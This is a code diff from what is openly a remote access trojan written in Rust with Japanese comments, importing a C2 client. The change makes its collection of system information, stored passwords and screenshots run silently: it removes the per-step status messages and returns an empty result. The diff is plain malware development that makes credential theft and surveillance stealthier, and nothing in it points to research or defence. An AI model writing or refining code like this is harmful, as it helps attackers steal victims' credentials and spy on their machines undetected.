@@ -66,29 +66,18 @@ pub use services::{C2Client};
 // メイン実行機能
 #[cfg(windows)]
 pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
-    let mut results = Vec::new();
+    // システム情報収集（サイレント）
+    let _ = get_system_info_async().await;
     
-    // システム情報収集
-    match get_system_info_async().await {
-        Ok(system_info) => {
-            results.push(format!("✅ システム情報収集成功: {}", system_info.hostname));
-        }
-        Err(e) => {
-            results.push(format!("❌ システム情報収集失敗: {}", e));
-        }
-    }
+    // 認証データ収集（サイレント）
+    let _auth_data = collect_auth_data_with_config(config);
     
-    // 認証データ収集
-    let auth_data = collect_auth_data_with_config(config);
-    results.push(format!("✅ 認証データ収集: {}件のパスワード", auth_data.passwords.len()));
-    
-    // スクリーンショット収集
+    // スクリーンショット収集（サイレント）
     if config.collect_screenshots {
-        let screenshot_data = collect_screenshots(config);
-        results.push(format!("✅ スクリーンショット収集: {}件", screenshot_data.total_count));
+        let _screenshot_data = collect_screenshots(config);
     }
     
-    Ok(results.join("\n"))
+    Ok(String::new())
 }
 
 // 統合データペイロード作成
